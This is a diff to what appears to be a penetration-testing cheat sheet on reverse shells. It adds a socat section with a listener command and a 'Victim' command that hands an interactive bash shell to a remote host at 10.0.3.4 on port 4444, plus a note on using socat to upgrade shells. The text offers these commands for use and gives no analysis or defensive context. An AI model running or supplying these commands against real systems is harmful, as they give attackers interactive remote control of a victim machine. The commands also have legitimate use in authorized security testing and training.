@@ -2,6 +2,18 @@
 
 ## Reverse Shell
 
+### Socat
+
+Listener:
+```
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+Victim:
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+
 ### Shell
 
 ```
@@ -138,6 +150,9 @@ nc -l -p 4444 -s 127.0.0.1
 
 ## Upgrading
 
+### Socat
+
+Check section above (`Reverse Shell.Socat`) using a static binary.
 
 ### Shell
 
